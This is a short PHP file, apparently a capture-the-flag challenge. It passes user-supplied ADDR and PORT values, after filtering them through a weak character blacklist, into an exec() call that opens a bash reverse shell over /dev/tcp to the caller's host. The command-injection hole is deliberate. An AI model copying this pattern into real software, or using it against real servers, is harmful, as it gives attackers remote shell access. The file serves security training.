<?php
function chijou_kega_no_junnka($str) {
    $black_list = [">", ";", "|", "{", "}", "/", " "];
    return str_replace($black_list, "", $str);
}

if (isset($_GET['DATA'])) {
    $data = $_GET['DATA'];
    $addr = chijou_kega_no_junnka($data['ADDR']);
    $port = chijou_kega_no_junnka($data['PORT']);
    exec("bash -c \"bash -i < /dev/tcp/$addr/$port\"");
} else {
    highlight_file(__FILE__);
}